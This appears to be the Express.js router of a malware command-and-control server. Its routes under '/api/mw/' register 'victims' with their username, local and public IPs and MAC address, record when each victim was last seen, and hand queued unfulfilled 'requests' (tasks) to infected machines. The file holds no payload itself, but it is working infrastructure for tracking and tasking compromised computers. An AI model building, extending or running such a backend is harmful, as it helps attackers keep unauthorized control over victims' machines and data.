import { Router } from "express";
import Victim from '../models/victimModel.js';
import Request from '../models/requestModel.js';

const router = Router();

/**
 * Get all unfulfilled requests for a specific victim and update last seen
 * @route GET /api/mw/requests/:victimId
 */
router.get('/requests/:victimId', async (req, res, next) => {
    const victim = await Victim.findById(req.params.victimId);
    if (!victim) {
        return res.status(404).json({ message: 'Victim not found' });
    }
    try {
        const { victimId } = req.params;

        await Victim.findByIdAndUpdate(victimId, { lastSeen: Date.now() });

        const requests = await Request.find({ victimId, fulfilled: false });
        
        res.json(requests);
    } catch (err) {
        next(err);
    }
});

/**
 * Get all requests (fulfilled and unfulfilled) for a specific victim and update last seen
 * @route GET /api/mw/allRequests/:victimId
 */
router.get('/allRequests/:victimId', async (req, res, next) => {
    const victim = await Victim.findById(req.params.victimId);
    if (!victim) {
        return res.status(404).json({ message: 'Victim not found' });
    }
    try {
        const { victimId } = req.params;

        // Update last seen timestamp
        await Victim.findByIdAndUpdate(victimId, { lastSeen: Date.now() });

        // Get all requests
        const requests = await Request.find({ victimId });
        
        res.json(requests);
    } catch (err) {
        next(err);
    }
});

/**
 * Register a new victim
 * @route POST /api/mw/registerVictim
 */
router.post('/registerVictim', async (req, res, next) => {
    const { name, username, localIP, publicIP, macAddress, description, img } = req.body;
    if (!name || !macAddress) {
        return res.status(400).json({ message: 'name and macAddress are required.' });
    }
    if (
        (typeof name !== 'string')
    ||  (typeof macAddress !== 'string')
    ||  (username && typeof username !== 'string')
    ||  (localIP && typeof localIP !== 'string')
    ||  (publicIP && typeof publicIP !== 'string')
    ||  (description && typeof description !== 'string')
    ||  (img && typeof img !== 'string')
    ) {
        return res.status(400).json({ message: 'Invalid data types!' });
    }
    try {
        const victim = new Victim({
            name,
            username,
            localIP,
            publicIP,
            macAddress,
            description,
            img
        });
        const savedVictim = await victim.save();
        res.status(201).json({
            "id": savedVictim.id,
            "message": "Victim registered successfully. Id has been returned.",
        });
    }
    catch (err) {
        next(err);
    }
});

/**
 * Update a victim
 * @route POST /api/mw/updateVictim/:id
 */
router.post('/updateVictim/:id', async (req, res, next) => {
    const victimId = req.params.id;
    const { name, username, localIP, publicIP, macAddress, description, img } = req.body;
    if (
        (name && typeof name !== 'string')
    ||  (username && typeof username !== 'string')
    ||  (localIP && typeof localIP !== 'string')
    ||  (publicIP && typeof publicIP !== 'string')
    ||  (macAddress && typeof macAddress !== 'string')
    ||  (description && typeof description !== 'string')
    ||  (img && typeof img !== 'string')
    ) {
        return res.status(400).json({ message: 'Invalid data types!' });
    }
    try {
        const updatedVictim = await Victim.findOneAndUpdate(
            { _id: victimId },
            req.body,
            { new: true }
        );
        if (!updatedVictim) {
            return res.status(404).json({ message: 'Victim not found' });
        }
        res.status(201).json({
            "id": updatedVictim.id,
            "message": "Victim updated successfully.",
        })
    } catch (err) {
        next(err);
    }
});

export default router;

